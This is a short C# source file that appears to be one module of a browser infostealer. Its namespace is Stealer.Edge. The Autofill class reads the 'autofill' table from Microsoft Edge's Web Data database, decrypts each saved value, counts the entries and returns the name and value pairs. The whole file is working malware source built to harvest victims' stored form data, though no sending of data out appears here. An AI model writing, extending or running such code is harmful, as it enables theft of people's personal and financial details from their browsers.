using System.Collections.Generic;
using Stealer.Chromium;

namespace Stealer.Edge;

internal sealed class Autofill
{
	public static List<AutoFill> Get(string sWebData)
	{
		try
		{
			List<AutoFill> list = new List<AutoFill>();
			SQLite sQLite = SqlReader.ReadTable(sWebData, "autofill");
			if (sQLite == null)
			{
				return list;
			}
			for (int i = 0; i < sQLite.GetRowCount(); i++)
			{
				AutoFill item = default(AutoFill);
				item.sName = Crypto.GetUTF8(sQLite.GetValue(i, 1));
				item.sValue = Crypto.GetUTF8(Crypto.EasyDecrypt(sWebData, sQLite.GetValue(i, 2)));
				Counter.AutoFill++;
				list.Add(item);
			}
			return list;
		}
		catch
		{
			return new List<AutoFill>();
		}
	}
}
